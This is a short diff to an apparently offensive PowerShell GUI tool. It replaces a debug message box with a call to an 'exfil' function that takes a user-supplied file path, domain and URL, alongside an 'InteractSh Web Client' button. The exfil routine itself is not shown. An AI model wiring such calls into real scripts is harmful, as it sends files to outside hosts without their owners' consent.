@@ -91,7 +91,8 @@ $executeButton.Add_Click({
     $filePath = $filePathInput.Text
 
     # Example: Output the values
-    [System.Windows.Forms.MessageBox]::Show("Regex: $regex`nDomain: $domain`nURL: $url`nFile Path: $filePath")
+    #[System.Windows.Forms.MessageBox]::Show("Regex: $regex`nDomain: $domain`nURL: $url`nFile Path: $filePath")
+    exfil -regex "$regex" -domain "$domain" -url "$url" -filepath $filepath
 })
 
 # Create 'InteractSh Web Client' button
